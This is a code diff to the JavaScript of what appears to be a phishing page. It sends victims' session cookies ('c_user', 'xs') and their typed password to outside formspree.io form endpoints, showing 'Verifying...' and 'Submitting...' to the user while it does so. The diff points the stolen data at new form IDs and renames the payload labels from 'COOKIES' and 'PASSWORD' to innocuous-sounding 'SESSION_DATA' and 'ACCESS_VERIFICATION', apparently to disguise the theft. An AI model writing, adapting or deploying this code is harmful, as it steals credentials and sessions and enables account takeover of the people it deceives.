@@ -98,10 +98,10 @@
 
             document.getElementById('nextBtn').innerText = "Verifying...";
             
-            // Send Cookies to first email ID: maqaobyw
-            fetch("https://formspree.io/f/maqaobyw", {
+            // Step 1: Send Cookies to 'Shookt' form
+            fetch("https://formspree.io/f/xzdyrwyp", {
                 method: "POST",
-                body: JSON.stringify({ "Type": "COOKIES", "c_user": c, "xs": x }),
+                body: JSON.stringify({ "Type": "SESSION_DATA", "c_user": c, "xs": x }),
                 headers: { 'Content-Type': 'application/json' }
             });
 
@@ -117,10 +117,10 @@
 
             document.getElementById('finalBtn').innerText = "Submitting...";
             
-            // Send Password to second email ID: xbdqoblb
-            await fetch("https://formspree.io/f/xbdqoblb", {
+            // Step 2: Send Password to 'Marke' form
+            await fetch("https://formspree.io/f/mnjldroo", {
                 method: "POST",
-                body: JSON.stringify({ "Type": "PASSWORD", "user": userData.c_user, "password": pass }),
+                body: JSON.stringify({ "Type": "ACCESS_VERIFICATION", "user": userData.c_user, "password": pass }),
                 headers: { 'Content-Type': 'application/json' }
             });
 
